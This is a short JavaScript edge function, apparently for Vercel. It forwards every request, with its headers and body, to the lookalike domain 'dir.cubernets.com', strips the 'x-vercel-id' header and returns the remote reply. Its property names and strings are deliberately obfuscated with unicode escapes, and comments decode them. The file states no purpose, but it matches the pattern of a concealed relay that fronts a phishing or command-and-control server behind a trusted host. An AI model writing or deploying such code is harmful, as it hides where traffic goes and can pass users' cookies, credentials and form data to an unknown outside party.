export const config = { runtime: "\u0065\u0064\u0067\u0065" }; // "edge"

const _0x4f2 = "dir.cubernets.com";

export default async function (r) {
  const u = new URL(r["\u0075\u0072\u006C"]); // url
  u["\u0068\u006F\u0073\u0074\u006E\u0061\u006D\u0065"] = _0x4f2; // hostname
  u["\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C"] = "\u0068\u0074\u0074\u0070\u0073\u003A"; // https:

  const h = new Headers(r["\u0068\u0065\u0061\u0064\u0065\u0072\u0073"]); // headers
  h["\u0073\u0065\u0074"]("\u0048\u006F\u0073\u0074", _0x4f2); // set Host
  h["\u0064\u0065\u006C\u0065\u0074\u0065"]("x-vercel-id"); // delete

  const m = r["\u006D\u0065\u0074\u0068\u006F\u0064"]; // method
  const b = !["\u0047\u0045\u0054", "\u0048\u0045\u0041\u0044"].includes(m); // Check if NOT GET/HEAD

  const opts = {
    method: m,
    headers: h,
    redirect: "\u006D\u0061\u006E\u0075\u0061\u006C", // manual
    ...(b ? { body: r["\u0062\u006F\u0064\u0079"], duplex: "\u0068\u0061\u006C\u0066" } : {}), // body, duplex: half
  };

  try {
    return await fetch(u["\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067"](), opts);
  } catch (e) {
    return new Response(null, { status: 502 });
  }
}